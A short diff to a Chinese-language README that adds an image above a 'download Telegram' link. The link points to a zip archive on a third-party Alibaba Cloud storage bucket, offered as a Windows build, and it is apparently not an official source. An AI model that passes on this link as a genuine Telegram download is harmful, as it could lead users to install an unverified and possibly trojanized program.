@@ -32,4 +32,13 @@ Telegram 支持丰富的机器人和插件，您可以使用它们来自动回�
 
 ## 📥 立即下载Telegram
 
+
+
+
+
+
+
+
+![MO-pic-1080-csj-1015-1](https://user-images.githubusercontent.com/132629522/236365844-daaf9236-da3d-4e1e-8c48-e0eba6f23bdf.jpg)
+
 <a href="https://paxiong.oss-cn-hongkong.aliyuncs.com/%E7%BA%B8%E9%A3%9E%E6%9C%BA%E4%B8%AD%E6%96%87.zip">[点击此处下载Telegram]</a> 仅支持Windows系统
